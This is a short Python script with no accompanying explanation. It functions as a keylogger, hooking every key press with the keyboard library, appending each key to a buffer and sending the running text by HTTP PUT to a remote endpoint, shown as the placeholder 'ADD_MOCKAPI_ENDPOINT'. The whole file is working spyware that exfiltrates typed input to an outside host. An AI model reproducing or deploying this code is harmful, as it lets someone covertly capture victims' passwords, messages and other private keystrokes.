import keyboard
import sys
import requests

try:
    endpoint = "ADD_MOCKAPI_ENDPOINT"
    data = requests.get(f"{endpoint}/1").json()

except requests.RequestException as e:
    print(e); sys.exit(1)

def on_key_press(event):
    data["char"] += " " if event.name == "space" else event.name
    requests.put(f"{endpoint}/1", json={"char": data["char"]})

keyboard.on_press(on_key_press)
keyboard.wait()